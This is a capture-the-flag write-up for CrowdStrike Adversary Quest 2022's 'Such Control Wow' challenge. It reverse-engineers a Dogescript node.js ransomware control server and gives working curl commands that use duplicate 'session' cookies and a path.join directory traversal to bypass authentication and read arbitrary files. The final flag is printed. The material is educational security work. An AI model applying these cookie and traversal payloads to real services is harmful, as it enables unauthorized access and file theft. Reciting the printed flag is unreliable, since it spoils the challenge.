# Crowdstrike Adversary Quest 2022 / Catapult Spider / #2 Such Control Wow

## Challenge Description

The ransomware was installed on a customer’s computer via a malicious CHM file. The PowerShell script that you analyzed previously installed multiple second stage binaries, including a binary that enables CATAPULT SPIDER to control the execution of the ransomware. The ransomware has locked the customer completely out of their machines and encrypted their data. The customer does not want to pay the ransom and has asked us for help in unlocking one of their systems. Can you find a way to unlock the machine without paying the ransom? We have obtained a version of the control binary for you to analyze. The locked machine is reachable at the IP 116.202.161.100.

## Pre-Requisites

```txt
$ sudo npm install -g dogescript
```

## TL;DR Summary

- The supplied server/control binary is a compiled node.js application written in Dogescript
- The authentication checks can be bypassed with two Cookies with the same name **session**
- Exploiting a directory traversal vulnerability (**path.join()**) in **checkAuth()** allows access to the control functions.
- Using the function **readfile**, the flag file can be read remotely.

## Analysis

The file **control.exe** is quite large, roughly 50 MiB. It is a 64 Bit Windows PE executable.

```txt
$ file control.exe 
control.exe: PE32+ executable (console) x86-64, for MS Windows
```

Strings output yields Dogescript (some _fun_ language that compiles into javascript) at the end of the file. We can manually copy/dump the dogescript to a file called [**dogescript.djs**](./dogescript.djs).

Catapult Spider has been known to use compiled node.js binaries with Dogescript in the past as well, so that's not a surprise. ;-) See CrowdStrike's Adversary Quest 2021, Challenge 2 ("Very Protocol") of Catapult Spider track.

Compile the Dogescript to JavaScript with `dogescript dogescript.djs > javascript.js` and beautify it a bit with Notepad++ JS-Tool/Format to **javascript_formatted.js**

**TODO** link to javascript.js and javascript_formatted.js

The script seems to listen on port 8124.

First connection:

```txt
$ curl http://116.202.161.100:8124
Nothing here.
```

Reaction **Nothing here** came from line 477 of javascript_formatted.js.

The script seems to implement the following commands

- auth (lines 144+, methods GET and POST)
- readfile (lines 210+, method GET)
- dirlist (lines 272+, method GET)
- unlock (lines 323+, method GET)
- decrypt (lines 365+, method GET)
- wipe (lines 420+, method GET)
- logout (lines 455+)

Trying to retrieve a directory listing from the current working directory could work like this:

```txt
$ curl http://116.202.161.100:8124/dirlist?dir=.
Not authorized.
```

To be able to use the commands, the condition `if (user != null && authorized)` has to evaluate to true. `user` is derived from `user = getUserSession(cookies['session']);` and `authorized` from `authorized = checkAuth(request);`

### Closer Look at sessionid Generation and Usage

A new `sessionid` would be created, if we were able to call the `/auth` command. If we supply the correct username and password, `createSession(user, request.socket.remoteAddress);` is called. The resulting `sessionid` is then used as a Cookie.

Since the password is set randomly to a 20 byte long value, there is no point in trying to guess that (line 13).

How are sessions created?

```javascript
function createSession(user, ip) {
    var rand = Math.floor(Math.random() * 32000);
    var sessionbfr = Buffer.from(`${user}/${ip}/${rand}`);
    var b64_session = sessionbfr.toString('base64')
        .replace(/\+/g, '-')
        .replace(/\//g, '_');
    var content = JSON.stringify({
        'user': user,
        'ip': ip
    });
    fs.writeFileSync(path.join(AuthStore, b64_session), content);
    return b64_session;
}
```

The string `sessionbfr` contains username, ip-address and a random value concatenated with slashes. It is base64 encoded (url-safe) and then used as a filename (`b64_session`). Since `AuthStore` has the value of `/tmp/sessions/` (line 9), a JSON string with user and ip values is written to the file path `/tmp/sessions/` concatenated with value of `b64_session`.

How are session values checked? The function `getUserSessions` is called with the cookie value `session`.

```javascript
function getUserSession(session) {
    try {
        var sessionbfr = Buffer.from(session.replace(/-/g, '+').replace(/_/g, '/'), 'base64');
        var sessionstr = sessionbfr.toString('utf8');
    } catch (err) {
        console.error(`Failed\x20to\x20get\x20user:\x20${err}`);
        return null;
    }
    var parts = sessionstr.split('/');
    if (parts.length != 3) {
        return null;
    }
    return parts[0];
}
```

The session cookie value is base64 decoded, split at slash characters. It has to only contain two slashes so it splits in exactly three parts. The first part is returned as the username. It is not checked, if the corresponding session file exists in the `AuthStore`.

So in order to fill the variable `user = getUserSession(cookies['session']);`, we could just supply any base64 encoded (url-safe) string like `dummy//`, which encodes to `ZHVtbXkvLw==`

### Closer look at function checkAuth

Additionally, we need to have the function `checkAuth` return `true` in order to be allowed to execute commands.

```javascript
function checkAuth(request) {
    var rc = request.headers.cookie;
    if (!rc) {
        return false;
    }
    var cookies = rc.split(';');
    for (const cookie of cookies) {
        var parts = cookie.split('=');
        if (parts.shift().trim() === 'session') {
            var session = decodeURI(parts.join('='))
                console.log('Session: ' + session);
            var sessionPath = path.join(AuthStore, session)
                console.log('Path: ' + sessionPath);
            if (fs.existsSync(sessionPath)) {
                console.log('File exists.');
                return true;
            }
        }
    }
    return false;
}
```

This function parses the list of all cookie values, looking for a session cookie (as well). It evaluates if a file at `path.join(AuthStore, session)` exists and then returns true.

While we are unable to guess existing sessionid values in the `AuthStore`, `path.join` seems vulnerable to a directory traversal attack.

If we could create a path to an existing file, `checkAuth` will return true. Line 11 yields `UNLOCK_FILE = 'C:\\Windows\\flag.txt';`, which could be used for this approach.

#### Executing our first Command

In order to execute a command, we need to set two cookie values - both named `session`.

- One has to fulfill the requirements for `checkAuth` (directory traversal to a file path we know exists on the host)
- The other has to yield a username for `getUserSessions` (base64 url-safe encoded string with two slashes)

While `checkAuth` iterates over all cookies, `getUserSessions` is called with `cookies['session']`. For this approach to work out, the order of the cookies with the same name `session` might be relevant. Which one does node.js return for `getUserSessions`: the first or last occurrence?

```txt
$ curl --cookie "session=ZHVtbXkvLw==;session=../../Windows/flag.txt" http://116.202.161.100:8124/dirlist?dir=.
Not authorized.

$ curl --cookie "session=../../Windows/flag.txt;session=ZHVtbXkvLw==" http://116.202.161.100:8124/dirlist?dir=.
such "Directory" is "." next "Listing" is so "control.js" next "node_modules" next "server.djs" many wow
```

Awesome!

#### Executing some commands

Now that we can execute commands, let's poke around...

```txt
$ curl --cookie "session=../../Windows/flag.txt;session=ZHVtbXkvLw==" http://116.202.161.100:8124/readfile?filename=./control.js
const lefs = require('fs'); const ledogescript = require('dogescript'); var doge_file = lefs.readFileSync('./server.djs').toString('utf-8'); const the_doge = eval(ledogescript(doge_file));
```

```txt
$ curl --cookie "session=../../Windows/flag.txt;session=ZHVtbXkvLw==" http://116.202.161.100:8124/unlock
such "unlock" is "Rvq8/ZXdIFwKaCjbM8AAvfWyaO8f5AEMfUOJwX+ERHc=" next "date" is "Wed Jul 13 2022 13:09:33 GMT-0700 (Pacific Daylight Time)" wow
```

That is supposedly the base64 value of the SHA256 hash of the flag. Not very helpful... (see function `unlock`, lines 94+).

## Now it's Flag Time!

```txt
$ curl --cookie "session=../../Windows/flag.txt;session=ZHVtbXkvLw==" http://116.202.161.100:8124/readfile?filename=../../../Windows/flag.txt
CS{such_m4ny_C00kies_c0nfUs3d_w0w}
```

Flag: **CS{such_m4ny_C00kies_c0nfUs3d_w0w}**
